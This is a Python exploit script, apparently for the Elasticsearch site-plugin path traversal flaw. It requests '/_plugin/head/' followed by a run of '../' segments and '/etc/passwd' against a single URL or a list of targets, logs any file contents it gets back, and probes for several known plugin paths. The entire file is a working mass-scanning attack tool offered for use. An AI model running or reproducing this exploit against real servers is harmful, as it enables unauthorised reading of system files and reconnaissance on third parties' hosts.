# -*- coding: utf-8 -*-
import requests
import argparse
import sys

succlog=open('result.txt','a')
pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']



def exploit(target):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    file='/etc/passwd'

    url = target + "/_plugin/head/../../../../../../../../.." + file

    try:
        r = requests.get(url,headers=headers,timeout=5)
        if r.status_code == 200:
            succlog.write(url+'\n'+r.content+'\n')
    except:
        pass
    for plugin in pluginList:
        pluginurl=target+'/_plugin/%s/' %plugin
        try:
            r1=requests.get(pluginurl,headers=headers,timeout=5)
            if r1.status_code == 200:
                succlog.write(pluginurl + 'find plugin\n' )
        except:
            pass


if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)